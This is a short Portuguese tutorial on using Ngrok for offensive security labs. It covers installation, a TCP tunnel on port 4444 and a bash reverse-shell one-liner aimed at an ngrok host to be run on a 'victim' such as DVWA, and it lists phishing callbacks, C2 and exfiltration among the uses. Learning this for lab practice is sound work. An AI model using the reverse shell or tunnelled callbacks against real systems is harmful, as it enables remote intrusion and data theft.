# NGROK

🌍 O que é o Ngrok?

Ngrok cria túneis seguros entre a internet e sua máquina local, permitindo que um servidor (ex: web, listener, etc.) local seja acessado de fora — mesmo atrás de NAT ou firewall.

⸻

🧱 Casos de uso comuns para segurança ofensiva:
	1.	Receber uma shell reversa mesmo sem IP público
	2.	Testar payloads em máquinas fora da sua rede
	3.	Compartilhar servidores web locais (ex: DVWA, C2, listener)
	4.	Atuar como servidor de callback para phishing ou exfiltração

⸻

🚀 Como usar o Ngrok (passo a passo)

1. 🔽 Baixar e instalar

Acesse: https://ngrok.com/download

Linux:

wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
unzip ngrok
sudo mv ngrok /usr/local/bin/

2. 🔑 Autenticar (opcional, mas recomendado)

Crie uma conta gratuita no site e pegue seu token. Depois:

ngrok config add-authtoken SEU_TOKEN


⸻

3. 📡 Criar um túnel (ex: porta 4444 para shell reversa)

ngrok tcp 4444

Isso cria um túnel público como:

tcp://0.tcp.ngrok.io:12345 → localhost:4444

4. 🎯 Usar em payload reverso

Na vítima (ex: em DVWA, Command Injection, etc):

bash -i >& /dev/tcp/0.tcp.ngrok.io/12345 0>&1

Pronto! A shell reversa virá pelo túnel.

⸻

💡 Outros usos:
	•	Expor um servidor web local:

ngrok http 80


	•	Ver logs, requisições e interações via web:

http://localhost:4040



⸻

🛡️ Dicas de segurança
	•	Use só em labs, nunca em ambientes de produção sem controle
	•	Cuidado ao usar Ngrok para simular phishing ou C2, pois o tráfego pode ser monitorado
	•	Se estiver usando para shells ou payloads, sempre teste localmente antes